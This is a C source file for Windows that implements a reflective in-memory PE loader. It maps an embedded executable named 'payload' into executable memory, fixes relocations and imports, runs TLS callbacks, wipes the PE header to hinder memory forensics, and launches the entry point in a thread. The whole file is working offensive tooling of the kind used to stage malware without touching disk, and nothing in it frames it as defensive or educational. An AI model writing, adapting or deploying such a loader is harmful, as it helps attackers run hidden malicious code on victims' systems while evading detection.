#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include "bytes.h"

typedef HMODULE(WINAPI* tLoadLibraryA)(LPCSTR);
typedef FARPROC(WINAPI* tGetProcAddress)(HMODULE, LPCSTR);

typedef struct _MY_DATA {
    tLoadLibraryA pLoadLibraryA;
    tGetProcAddress pGetProcAddress;
    LPVOID baseAddress;
} MY_DATA, * PMY_DATA;

PIMAGE_DOS_HEADER GetDosHeader(LPVOID base) {
    return (PIMAGE_DOS_HEADER)base;
}

PIMAGE_NT_HEADERS GetNtHeaders(LPVOID base) {
    PIMAGE_DOS_HEADER dos = GetDosHeader(base);
    return (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
}

BOOL MapSections(LPVOID dest, BYTE* src, PIMAGE_NT_HEADERS ntHeaders) {
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        LPVOID destSection = (BYTE*)dest + section[i].VirtualAddress;
        printf("    - Section %d mapped: %.8s (VA: %p, Size: 0x%X)\n", i, section[i].Name, destSection, section[i].SizeOfRawData);
        memcpy(destSection, src + section[i].PointerToRawData, section[i].SizeOfRawData);
    }
    return TRUE;
}

BOOL PerformBaseRelocation(LPVOID base, ULONGLONG delta, PIMAGE_DATA_DIRECTORY relocationDir) {
    if (relocationDir->Size == 0) return TRUE;

    PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)((BYTE*)base + relocationDir->VirtualAddress);
    PIMAGE_BASE_RELOCATION relocationEnd = (PIMAGE_BASE_RELOCATION)((BYTE*)relocation + relocationDir->Size);

    while (relocation < relocationEnd && relocation->SizeOfBlock) {
        DWORD count = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* list = (WORD*)(relocation + 1);

        for (DWORD i = 0; i < count; i++) {
            if ((list[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                ULONGLONG* patchAddr = (ULONGLONG*)((BYTE*)base + relocation->VirtualAddress + (list[i] & 0x0FFF));
                *patchAddr += delta;
            }
        }

        relocation = (PIMAGE_BASE_RELOCATION)((BYTE*)relocation + relocation->SizeOfBlock);
    }

    return TRUE;
}

BOOL ResolveImports(LPVOID base, PIMAGE_NT_HEADERS ntHeaders, tLoadLibraryA pLoadLibraryA, tGetProcAddress pGetProcAddress) {
    PIMAGE_DATA_DIRECTORY importsDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importsDir->Size == 0) return TRUE;

    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)base + importsDir->VirtualAddress);

    while (importDesc->Name) {
        char* dllName = (char*)((BYTE*)base + importDesc->Name);
        printf("    - Loading DLL: %s\n", dllName);
        HMODULE dllHandle = pLoadLibraryA(dllName);
        if (!dllHandle) return FALSE;

        PIMAGE_THUNK_DATA thunkILT = (PIMAGE_THUNK_DATA)((BYTE*)base + importDesc->OriginalFirstThunk);
        PIMAGE_THUNK_DATA thunkIAT = (PIMAGE_THUNK_DATA)((BYTE*)base + importDesc->FirstThunk);

        while (thunkILT->u1.AddressOfData) {
            FARPROC func = NULL;

            if (thunkILT->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                func = pGetProcAddress(dllHandle, (LPCSTR)(thunkILT->u1.Ordinal & 0xFFFF));
            }
            else {
                PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)base + thunkILT->u1.AddressOfData);
                func = pGetProcAddress(dllHandle, (LPCSTR)importByName->Name);
            }

            if (!func) return FALSE;

            thunkIAT->u1.Function = (ULONGLONG)func;

            thunkILT++;
            thunkIAT++;
        }
        importDesc++;
    }
    return TRUE;
}

DWORD WINAPI PeLoaderThread(LPVOID param) {
    MY_DATA* data = (MY_DATA*)param;
    BYTE* exeBuffer = payload; 
    SIZE_T exeSize = payload_len;

    printf("[+] Validating DOS header\n");
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)exeBuffer;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] Invalid DOS signature\n");
        return 1;
    }

    printf("[+] Validating NT header\n");
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(exeBuffer + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] Invalid NT signature\n");
        return 1;
    }

    SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
    printf("[+] Allocating memory for image (size: 0x%zX)\n", imageSize);

    LPVOID imageBase = VirtualAlloc((LPVOID)(ntHeaders->OptionalHeader.ImageBase),
        imageSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (!imageBase) {
        printf("[+] Preferred base allocation failed, trying NULL base\n");
        imageBase = VirtualAlloc(NULL,
            imageSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);
        if (!imageBase) {
            printf("[!] VirtualAlloc failed\n");
            return 1;
        }
    }

    printf("[+] Memory allocated at: %p\n", imageBase);

    printf("[+] Copying headers\n");
    memcpy(imageBase, exeBuffer, ntHeaders->OptionalHeader.SizeOfHeaders);

    printf("[+] Mapping sections:\n");
    if (!MapSections(imageBase, exeBuffer, ntHeaders)) {
        printf("[!] Failed to map sections\n");
        return 1;
    }

    ULONGLONG delta = (ULONGLONG)imageBase - ntHeaders->OptionalHeader.ImageBase;
    if (delta != 0) {
        printf("[+] Performing base relocations\n");
        if (!PerformBaseRelocation(imageBase, delta, &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC])) {
            printf("[!] Relocation failed\n");
            return 1;
        }
        printf("[+] Base relocations done\n");
    }
    else {
        printf("[+] No base relocations needed\n");
    }

    printf("[+] Resolving imports\n");
    if (!ResolveImports(imageBase, ntHeaders, data->pLoadLibraryA, data->pGetProcAddress)) {
        printf("[!] Import resolution failed\n");
        return 1;
    }
    printf("[+] Imports resolved successfully\n");

    // Run TLS callbacks if any
    PIMAGE_DATA_DIRECTORY tlsDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (tlsDir->Size > 0) {
        PIMAGE_TLS_DIRECTORY tls = (PIMAGE_TLS_DIRECTORY)((BYTE*)imageBase + tlsDir->VirtualAddress);
        if (tls && tls->AddressOfCallBacks) {
            printf("[+] Running TLS callbacks\n");
            PIMAGE_TLS_CALLBACK* callback = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
            while (*callback) {
                (*callback)(imageBase, DLL_PROCESS_ATTACH, NULL);
                callback++;
            }
            printf("[+] TLS callbacks executed\n");
        }
    }
    else {
        printf("[+] No TLS callbacks found\n");
    }

    printf("[+] Erasing PE header\n");
    memset(imageBase, 0, ntHeaders->OptionalHeader.SizeOfHeaders);

    // Call entry point via thread and pass imageBase as param
    DWORD entryRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;
    if (entryRVA == 0) {
        printf("[!] No entry point\n");
        return 1;
    }

    LPTHREAD_START_ROUTINE entryPoint = (LPTHREAD_START_ROUTINE)((BYTE*)imageBase + entryRVA);
    printf("[+] Creating thread at entry point: %p\n", entryPoint);

    HANDLE hThread = CreateThread(NULL, 0, entryPoint, imageBase, 0, NULL);
    if (!hThread) {
        printf("[!] Failed to create thread\n");
        return 1;
    }

    printf("[+] Waiting for loader thread to finish\n");
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}

int main() {
    printf("[+] Resolving APIs dynamically\n");

    MY_DATA data;
    data.pLoadLibraryA = LoadLibraryA;
    data.pGetProcAddress = GetProcAddress;
    data.baseAddress = NULL;

    HANDLE hThread = CreateThread(NULL, 0, PeLoaderThread, &data, 0, NULL);
    if (!hThread) {
        printf("[!] Failed to create loader thread\n");
        return 1;
    }

    printf("[+] Waiting for loader thread to finish\n");
    WaitForSingleObject(hThread, INFINITE);

    printf("[+] Loader thread finished\n");

    return 0;
}
